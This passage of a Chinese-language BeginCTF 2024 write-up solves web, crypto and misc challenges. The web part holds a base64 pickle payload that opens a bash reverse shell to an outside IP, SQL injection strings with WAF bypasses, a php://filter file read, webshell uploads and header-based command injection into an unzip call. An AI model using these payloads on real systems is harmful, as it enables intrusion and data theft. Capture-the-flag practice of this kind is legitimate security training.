class="line"></span><br><span class="line">login()</span><br><span class="line"><span class="comment"># b&#x27;gASVcgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxWX19pbXBvcnRfXygib3MiKS5wb3BlbigiYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzIzMzMgMD4mMSciKS5yZWFkKCmUhZRSlC4=&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/./BeginCTF/w_3_3.png"></p><h2 id="sql教学局"><a href="#sql教学局" class="headerlink" title="sql教学局"></a>sql教学局</h2><p>sql联合注入</p><p>说明：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你需要通过SQL注入的手法，并绕过一些waf，来拿到3段flag</span><br><span class="line"></span><br><span class="line">第一段flag位于 secret数据库password表的某条数据</span><br><span class="line">第二段flag位于 当前数据库score表，学生begin的成绩(grade)</span><br><span class="line">第三段flag位于 /flag</span><br></pre></td></tr></table></figure><p>过滤：</p><table><thead><tr><th align="center">过滤</th><th align="center">绕过</th></tr></thead><tbody><tr><td align="center">空格</td><td align="center">&#x2F;**&#x2F;</td></tr><tr><td align="center">or</td><td align="center">双写，oorr</td></tr><tr><td align="center">&#x3D;</td><td align="center">like</td></tr><tr><td align="center">select</td><td align="center">双写 selselectect</td></tr><tr><td align="center">frome</td><td align="center">双写 frfromom</td></tr><tr><td align="center">and</td><td align="center"></td></tr><tr><td align="center">load</td><td align="center">双写 loloadad</td></tr></tbody></table><p><strong>flag1</strong></p><p>查表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1&#x27;/**/union/**/selselectect/**/group_concat(table_name)/**/frfromom/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/&#x27;ctf&#x27;%23</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password</span><br></pre></td></tr></table></figure><p>查列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1&#x27;/**/union/**/selselectect/**/GROUP_CONCAT(COLUMN_NAME)/**/frfromom/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/&#x27;passwoorrd&#x27;%23</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id,note,flag</span><br></pre></td></tr></table></figure><p>查数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1&#x27;/**/union/**/selselectect/**/flag/**/frfromom/**/secret.passwoorrd%23</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;d2c3f0d3-</span><br></pre></td></tr></table></figure><p><strong>flag2</strong></p><p>直接查数据即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1&#x27;/**/union/**/selselectect/**/grade/**/frofromm/**/scoorre/**/where/**/student/**/like/**/&#x27;begin&#x27;%23</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fffb-4263-a255</span><br></pre></td></tr></table></figure><p><strong>flag3</strong></p><p>读文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1&#x27;/**/union/**/selselectect/**/loloadad_file(&#x27;/flag&#x27;)%23</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-75ff2dda0726&#125;</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;d2c3f0d3-fffb-4263-a255-75ff2dda0726&#125;</span><br></pre></td></tr></table></figure><h2 id="zupload-zupload-pro-zupload-pro-plus"><a href="#zupload-zupload-pro-zupload-pro-plus" class="headerlink" title="zupload &#x2F; zupload-pro &#x2F; zupload-pro-plus"></a>zupload &#x2F; zupload-pro &#x2F; zupload-pro-plus</h2><p>这三个题都能用伪协议来做</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">action=php://filter/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><h2 id="zupload-pro-plus-max"><a href="#zupload-pro-plus-max" class="headerlink" title="zupload-pro-plus-max"></a>zupload-pro-plus-max</h2><p>先压缩一个zip，然后在zip后边添加上一句话木马，接着再上传。</p><p><img src="/./BeginCTF/w_6_1.png"></p><p>之后把上传的zip包含进来即可rce。</p><p><img src="/./BeginCTF/w_6_2.png"></p><h2 id="zupload-pro-plus-max-ultra"><a href="#zupload-pro-plus-max-ultra" class="headerlink" title="zupload-pro-plus-max-ultra"></a>zupload-pro-plus-max-ultra</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./upload&#x27;</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="variable">$extract_to</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_EXTRACT_TO&#x27;</span>] ?? <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$file_ext</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;unzip &#x27;</span> . <span class="variable">$file_tmp</span> . <span class="string">&#x27; -d &#x27;</span> . <span class="variable">$extract_to</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                ));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目使用了<code>exec</code>函数用<code>unzip</code>解压，这里有两种做法，做法二的演示放在<strong>zupload-pro-plus-max-ultra-premium</strong>这一题。</p><p><strong>解法一：</strong></p><p>控制<code>$extract_to</code>参数，可以利用截断来执行新的命令。把命令执行的输出写到文件里，可以实现rce。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$extract_to = $_SERVER[&#x27;HTTP_X_EXTRACT_TO&#x27;] ?? &#x27;uploads/&#x27;;</span><br></pre></td></tr></table></figure><p><code>$extract_to</code>参数是通过http头<code>X-EXTRACT-TO</code>传入的，因此控制这个即可。</p><p><img src="/./BeginCTF/w_7_1.png"></p><p>访问<code>1</code>，即可看到flag。</p><p><img src="/./BeginCTF/w_7_2.png"></p><h2 id="zupload-pro-plus-max-ultra-premium"><a href="#zupload-pro-plus-max-ultra-premium" class="headerlink" title="zupload-pro-plus-max-ultra-premium"></a>zupload-pro-plus-max-ultra-premium</h2><p>因为是用的<code>unzip</code>解压，因此可以使用软链接来链接到根目录的flag。</p><p>参考：<a href="https://blog.csdn.net/qq_73767109/article/details/131033346">CTFSHOW国赛复现—–Unzip(软连接利用)</a></p><p>先压缩一个软链接 。</p><p><img src="/./BeginCTF/w_8_1.png"></p><p>然后把压缩包上传，之后访问<code>/uploads/flag</code>即可得到flag。</p><p><img src="/./BeginCTF/w_8_2.png"></p><h2 id="zupload-pro-revenge"><a href="#zupload-pro-revenge" class="headerlink" title="zupload-pro-revenge"></a>zupload-pro-revenge</h2><p>只有前端过滤，抓包改后缀即可。</p><p><img src="/./BeginCTF/w_9_1.png"></p><p>之后访问<code>/uploads/shell.php</code>即可rce。</p><p><img src="/./BeginCTF/w_9_2.png"></p><h2 id="zupload-pro-plus-enhanced"><a href="#zupload-pro-plus-enhanced" class="headerlink" title="zupload-pro-plus-enhanced"></a>zupload-pro-plus-enhanced</h2><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?action=upload&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>][<span class="number">0</span>] === <span class="string">&#x27;/&#x27;</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>], <span class="string">&#x27;/&#x27;</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="variable">$file_destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_tmp</span>, <span class="variable">$file_destination</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>观察这段代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">xxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对文件名的处理是以<code>.</code>为分割把文件名分成数组，再判断这个数组存不存在<code>zip</code>字符串。</p><p>那么我们上传一个<code>shell.zip.php</code>的文件即可满足条件。</p><p><img src="/./BeginCTF/w_10_1.png"></p><p>访问<code>/uploads/shell.zip.php</code>即可rce。</p><p><img src="/./BeginCTF/w_10_2.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="fake-n"><a href="#fake-n" class="headerlink" title="fake_n"></a>fake_n</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fakeN_list</span>():</span><br><span class="line">    puzzle_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        r = getPrime(<span class="number">32</span>)</span><br><span class="line">        puzzle_list.append(r)</span><br><span class="line"></span><br><span class="line">    p = getPrime(<span class="number">32</span>)</span><br><span class="line">    q = getPrime(<span class="number">32</span>)</span><br><span class="line">    com = p*q</span><br><span class="line"></span><br><span class="line">    puzzle_list.append(com)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> puzzle_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m,e,fake_n_list</span>):</span><br><span class="line"></span><br><span class="line">    fake_n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fake_n_list)):</span><br><span class="line">        fake_n *= fake_n_list[i]</span><br><span class="line"></span><br><span class="line">    really_n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fake_n_list)-<span class="number">1</span>):</span><br><span class="line">        really_n *= fake_n_list[i]</span><br><span class="line"></span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,really_n)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;fake_n =&quot;</span>,fake_n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    fake_n_list = fakeN_list()</span><br><span class="line">    encrypt(m,e,fake_n_list)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 6451324417011540096371899193595274967584961629958072589442231753539333785715373417620914700292158431998640787575661170945478654203892533418902</span></span><br><span class="line"><span class="string">fake_n = 178981104694777551556050210788105224912858808489844293395656882292972328450647023459180992923023126555636398409062602947287270007964052060975137318172446309766581</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>先用yafu分解<code>fake_n</code>，然后一个一个试即可。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">c,e,phi,n</span>):</span><br><span class="line">    d = gmpy2.invert(e, phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c=<span class="number">6451324417011540096371899193595274967584961629958072589442231753539333785715373417620914700292158431998640787575661170945478654203892533418902</span></span><br><span class="line"></span><br><span class="line">N = [<span class="number">3429664037</span>,<span class="number">2290486867</span>,<span class="number">2333428577</span>,<span class="number">3417707929</span>,<span class="number">4098704749</span>,<span class="number">3278987191</span>,<span class="number">3965529989</span>,<span class="number">3716624207</span>,<span class="number">4267348123</span>,<span class="number">2507934301</span>,<span class="number">2215221821</span>,<span class="number">3389689241</span>,<span class="number">2446301969</span>,<span class="number">2590663067</span>,<span class="number">3107210929</span>,<span class="number">2361589081</span>,<span class="number">3859354699</span>]</span><br><span class="line"></span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> N:</span><br><span class="line">    n *= i</span><br><span class="line">    phi = (i-<span class="number">1</span>)*phi</span><br><span class="line">    flag = decode(c,e,phi,n)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">b&quot;begin&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># b&#x27;begin&#123;y0u_f1nd_th3_re4l_n&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="PAD"><a href="#PAD" class="headerlink" title="PAD"></a>PAD</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random, math</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">flag=flag[:<span class="number">64</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSA</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, m: <span class="built_in">int</span></span>):</span><br><span class="line">        self.p, self.q, self.e, self.m = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>), getRandomRange(<span class="number">1</span>,<span class="number">8</span>), m</span><br><span class="line">        self.n = self.p * self.q</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Publickey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (self.n, self.e,self.c)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        pad = PAD(m=self.m, e=<span class="number">0</span>)</span><br><span class="line">        pad.PAD()</span><br><span class="line">        self.c = (pad.e,<span class="built_in">pow</span>(pad.M, self.e, self.n))</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PAD</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, m: <span class="built_in">int</span>, e</span>):</span><br><span class="line">        self.e, self.m, self.mbits = e, m, m.bit_length()</span><br><span class="line">        <span class="keyword">if</span> e == <span class="number">0</span>:</span><br><span class="line">            self.e = getRandomRange(<span class="number">2</span>, <span class="number">7</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">PAD</span>(<span class="params">self</span>):</span><br><span class="line">        self.M = <span class="built_in">pow</span>(self.e, self.mbits) + <span class="built_in">pow</span>(self.m, self.e)</span><br><span class="line">GIFT = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;GIFT.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        rsa = RSA(m=GIFT)</span><br><span class="line">        rsa.Encrypt()</span><br><span class="line">        f.write(<span class="built_in">str</span>(rsa.Publickey()) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看<code>GIFT.txt</code>，有类似这样的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(105489743033600776618404736924014082773234739025040235918547880079849719971737127359304073614094075884043630513694448370483208184306027684643273284267932051217742004175757404293643624264846421545917186078199365762796141089940330731024030929168374696605389962930325106070659194496163327222019090112724836643593, 1, (2, 26557762379124264922132214420209728936796452559751033517820166259647971200493029434772959145551662395540203237914969022639479368547265045300822940244603592956901947131088363115332681941180989239355596363143445708865429254462912210194997411474244175252940834791770566886483490068164580622099300335891131365129))</span><br></pre></td></tr></table></figure><p>结合上面源码分析，如果rsa的e&#x3D;1时，输出的c大概率是m。</p><p>对于<code>PAD</code>部分，很显然<code>pow(self.m, self.e)</code> 远大于 <code>pow(self.e, self.mbits)</code>，那当e&#x3D;2时，开根号取整即可得到flag。</p><p>这里需要考虑开根号后浮点数的精度问题，要用<code>gmpy2.isqrt</code>来开根号。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">m = <span class="number">26557762379124264922132214420209728936796452559751033517820166259647971200493029434772959145551662395540203237914969022639479368547265045300822940244603592956901947131088363115332681941180989239355596363143445708865429254462912210194997411474244175252940834791770566886483490068164580622099300335891131365129</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(gmpy2.isqrt(m))))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;begin&#123;8E6C79D2-E960-C57A-F3E4-A52BC827ED6B_Dragon_Year_happy!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ezRsa"><a href="#ezRsa" class="headerlink" title="ezRsa"></a>ezRsa</h2><p>e很小，可以通过爆破k开平方得到m</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">7709388356791362098686964537734555579863438117190798798028727762878684782880904322549856912344789781854618283939002621383390230228555920884200579836394161</span></span><br><span class="line">c = <span class="number">5573755468949553624452023926839820294500672937008992680281196534187840615851844091682946567434189657243627735469507175898662317628420037437385814152733456</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = gmpy2.iroot(k*n+c,e)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(res[<span class="number">0</span>])[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;begin&#123;quadr4ticresidue_i5_s0_3asy&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="real-check-in"><a href="#real-check-in" class="headerlink" title="real check in"></a>real check in</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">为了选手有更好的游玩体验请及时加入beginctf2024官方群,群号:612995005</span><br><span class="line"></span><br><span class="line">从catf1y的笔记本中发现了这个神秘的代码MJSWO2LOPNLUKTCDJ5GWKX3UN5PUEM2HNFXEGVCGL4ZDAMRUL5EDAUDFL5MU6VK7O5UUYMK7GEYWWZK7NE3X2===</span><br><span class="line"></span><br><span class="line">你能帮助我找到最后的flag吗?</span><br><span class="line"></span><br><span class="line">Author: BeginCTF2024</span><br><span class="line"></span><br><span class="line">Difficult: baby</span><br></pre></td></tr></table></figure><p>base32解码即可得到flag。</p><h2 id="Tupper"><a href="#Tupper" class="headerlink" title="Tupper"></a>Tupper</h2><p>把txt的内容拼接起来，可以得到一串数字</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getstr</span>(<span class="params">filename</span>):</span><br><span class="line">    a = <span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(a)</span><br><span class="line">    </span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;=<span class="number">672</span>:</span><br><span class="line">    flag+=getstr(<span class="string">&#x27;./tupper/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line">    i+=<span class="number">4</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;14278193432728026049298574575557534321062349352543562656766469704092874688354679371212444382298821342093450398907096976002458807598535735172126657504131171684907173086659505143920300085808809647256790384378553780282894239751898620041143383317064727136903634770936398518547900512548419486364915399253941245911205262493591158497708219126453587456637302888701303382210748629800081821684283187368543601559778431735006794761542413006621219207322808449232050578852431361678745355776921132352419931907838205001184&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把这串数字放到 <a href="https://tuppers-formula.ovh/">Tupper’s Formula Tools</a> 画图，即可得到flag。</p><p><img src="/./BeginCTF/m_2_1.png"></p>]]></content>
      
